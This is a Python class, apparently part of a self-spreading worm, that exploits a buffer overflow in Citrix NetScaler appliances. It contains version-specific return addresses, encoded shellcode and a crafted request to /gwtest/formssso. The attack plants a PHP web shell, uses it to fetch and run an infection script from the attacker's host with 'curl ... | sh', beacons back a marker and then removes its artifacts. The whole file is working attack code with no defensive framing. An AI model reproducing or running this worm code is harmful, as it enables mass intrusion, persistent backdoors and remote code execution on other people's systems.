class CitrixNetScalerExploitSpreader:
    def __init__(self, persistence_manager, configmanager=None, logger=None):
        import logging, requests
        self.persistence_manager = persistence_manager
        self.configmanager = configmanager
        self.logger = logger or logging.getLogger("Internal.System.Core.citrix_spreader")
        self.stats = {"attempted": 0, "successful": 0, "failed": 0}
        self.session = requests.Session()
        self.session.verify = False

    def _get_seed_ip(self):
        import urllib.request
        providers = ['https://api.ipify.org', 'https://ident.me', 'https://checkip.amazonaws.com']
        for url in providers:
            try:
                with urllib.request.urlopen(url, timeout=5) as resp:
                    return resp.read().decode('utf-8').strip()
            except: continue
        return getattr(self.configmanager, 'SEED_IP', '127.0.0.1')


    def _get_return_address(self, version, attempt=0):
        """
        Return the correct JMP_RSP return address based on detected NetScaler version and attempt number.
        """
        # Exhaustive list of known return addresses mapped from Metasploit research
        return_addresses = {
            "13.1-48.47": [0x00611ae9, 0x00611ae9, 0x00611ae9], # jmp rsp; ns_create_cfg_nsp
            "13.1-37.38": [0x015d131d, 0x015d131d, 0x015d131d], # jmp rsp; tfocookie_send_callback
            "13.0-91.12": [0x024883bf, 0x024883bf, 0x024883bf], # jmp rsp; ns_pixl_eval_nvlist_t_typecast_list_t_dynamic
            "12.1-65.25": [0x007d0845, 0x007d0845, 0x007d0845], # jmp rsp; ns_audit_cmd2strrer
            "12.1-64.17": [0x01333f18, 0x01333f18, 0x01333f18], # jmp rsp; nssmpp_process_message_queue
            "13.1": [0x00611ae9, 0x015d131d, 0x02778c04],  # 13.1 fallbacks
            "13.0": [0x024883bf, 0x02778c04, 0x02778c04],  # 13.0 fallbacks
            "12.1": [0x007d0845, 0x01333f18, 0x0000212c],  # 12.1 fallbacks
            "12.0": [0x0000212c, 0x01888c04, 0x00002000],
            "11.1": [0x00002000, 0x0000212c, 0x01888c04],
        }
        
        if version:
            for ver, addrs in return_addresses.items():
                if version.startswith(ver):
                    return addrs[attempt % len(addrs)]
        
        # Fallback: Brute force common offsets across the 3 attempts
        fallback_addrs = [0x02778c04, 0x0000212c, 0x01888c04]
        addr = fallback_addrs[attempt % len(fallback_addrs)]
        print(f"Unknown version {version}, using fallback return address {hex(addr)} for attempt {attempt}")
        return addr

    def _get_shellcode(self, version=None):
        import base64
        # Pre-compiled shellcode for NetScaler 13.x (FreeBSD 11.3)
        # Compiled from BishopFox's mkshellcode NASM template
        SHELLCODE_13X = base64.b64decode(
            "SI09HgAAADHSagVYMfaWAgEWGv8BDwVQX2oEWEI1EAAAADHSshoADwWwD0iN"
            "PQwAAAAx9ma+bQ0PBXz8SI1sJDBojffHAA=="
        ) + b"<?=`curl {}|sh`;\x00/var/netscaler/logon/a.php\x00/bin/sh\x00"
        
        # We replace the payload template `{}` part with our command, but since 
        # the user requested the PHP backdoor: '<?php system(base64_decode($_POST["c"])); ?>'
        # The NASM code drops the file directly containing what is after the code block.
        # So we supply the exact binary block:
        
        # Authentic NASM payload bytes for 13.x (RBP_FIXUP=0x30, FIXUP=0xc7f78d)
        sc = base64.b64decode(
            "SI09KwAAADHSagVYMfaWAgEWGv8BDwVQX2oEWEI1FgAAADHSshoADwWwD0iN"
            "PQsAAAAx9ma+bQ0PBXz8SI1sJDBojffHAA=="
        )
        
        # Data section
        php_payload = b'<?php system(base64_decode($_POST["c"])); ?>'
        path1 = b"/var/netscaler/logon/a.php\x00"
        path2 = b"/bin/sh\x00"
        
        return sc + php_payload + path1 + path2
        
    def _tweaked_url_encode(self, data):
        out = b''
        for i in data:
            if i > 0x9f:
                out += bytes([i])
            else:
                out += '%{:02x}'.format(i).encode()
        return out

    def _build_payload(self, cmd, citrix_version=None, attempt=0):
        import struct
        RETURN_OFFSET = 168 # 0xa8
        
        shellcode = self._get_shellcode(citrix_version)
        return_address = self._get_return_address(citrix_version, attempt=attempt)
        
        # Pad shellcode to offset
        padding = b'\xcc' * (RETURN_OFFSET - len(shellcode))
        
        # Pack Return Address
        ret_pack = struct.pack("<Q", return_address)
        
        # Jump backward to shellcode (typically - (RETURN_OFFSET + 8 + 5))
        jmp_back = b'\xe9' + struct.pack("<i", -(RETURN_OFFSET + 8 + 5))
        
        payload = shellcode + padding + ret_pack + jmp_back
        
        return self._tweaked_url_encode(payload)

    def _cleanup_backdoor(self, target_ip, target_port):
        """
        Remove the PHP backdoor and restore /bin/sh permissions.
        """
        import base64, requests
        cleanup_cmd = "rm -f /var/netscaler/logon/a.php; chmod 755 /bin/sh; rm -f /var/netscaler/logon/theme.php"
        try:
            requests.post(
                f'https://{target_ip}:{target_port}/logon/a.php',
                data={'c': base64.b64encode(cleanup_cmd.encode()).decode()},
                verify=False, timeout=5
            )
            # Try fallback theme.php cleanup
            requests.post(
                f'https://{target_ip}:{target_port}/logon/theme.php',
                data={'c': base64.b64encode(cleanup_cmd.encode()).decode()},
                verify=False, timeout=5
            )
            print(f"Artifacts cleaned up on {target_ip}")
        except Exception as e:
            print(f"Cleanup failed: {e}")

    @safe_operation("citrix_exploitation")
    def exploit_target(self, target_ip, target_port=443, version=None):
        import random, string, urllib.parse, time, socket, ssl, requests, base64
        self.stats["attempted"] += 1
        
        my_seed_ip = self._get_seed_ip()
        marker = ''.join(random.choices(string.ascii_letters, k=12))
        
        raw_cmd = self.persistence_manager.get_immortal_infection_chain(seed_ip=my_seed_ip) if self.persistence_manager else f"curl -s http://{my_seed_ip}/infect.sh | sh"
        telem = f"curl -s http://{my_seed_ip}/telemetry/{marker} >/dev/null 2>&1 || fetch -q -o /dev/null http://{my_seed_ip}/telemetry/{marker} >/dev/null 2>&1"
        cmd_with_marker = f"({telem}); {raw_cmd}"
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        for attempt in range(3):
            # Generate the payload dynamically per attempt for ROP chain rotation
            payload_bytes = self._build_payload(cmd_with_marker, citrix_version=version, attempt=attempt)
            
            request  = b''
            request += b'GET /gwtest/formssso?event=start&target='
            request += payload_bytes
            request += f' HTTP/1.1\r\nHost: {target_ip}\r\n\r\n'.encode('utf-8')
            
            try:
                with socket.create_connection((target_ip, target_port), timeout=10) as sock:
                    with context.wrap_socket(sock) as ssock:
                        ssock.send(request)
                        
                        # Wait for PHP backdoor (a.php) to be dropped
                        time.sleep(2)
                        
                        # Verify the backdoor
                        head_res = requests.head(f'https://{target_ip}:{target_port}/logon/a.php', verify=False, timeout=5)
                        if head_res.status_code != 200:
                            print(f"Backdoor not found, retrying... (Attempt {attempt+1})")
                            time.sleep(2 ** attempt)
                            continue

                        # Execute command via POST request with base64 encoding
                        b64_cmd = base64.b64encode(cmd_with_marker.encode()).decode()
                        r = requests.post(
                            f'https://{target_ip}:{target_port}/logon/a.php', 
                            data={'c': b64_cmd}, verify=False, timeout=10
                        )
                        
                        # Cleanup the artifacts (best effort, do not crash on failure)
                        self._cleanup_backdoor(target_ip, target_port)
                        
                        if hasattr(self.configmanager, 'register_oob_marker'):
                            self.configmanager.register_oob_marker("citrix", target_ip, marker, self.stats)
                            for _ in range(10):
                                time.sleep(1)
                                if hasattr(self.configmanager, 'confirmed_markers') and marker in self.configmanager.confirmed_markers:
                                    self.logger.info(f"âœ… OOB confirmed for {target_ip} (Citrix)")
                                    return True
                            
                            # If we made it here, OOB was configured but didn't return.
                            # We consider it failed to prevent false positives.
                            print(f"OOB marker {marker} not received from {target_ip}")
                            continue
                        else:
                            # If no OOB configured, we assume 200 OK means success
                            if r.status_code == 200:
                                self.stats["successful"] += 1
                                return True
                            else:
                                continue
            except Exception as e:
                print(f"Citrix exploit failed: {e}")
            time.sleep(2 ** attempt)

        self.stats["failed"] += 1
        return False

    def get_stats(self): return self.stats


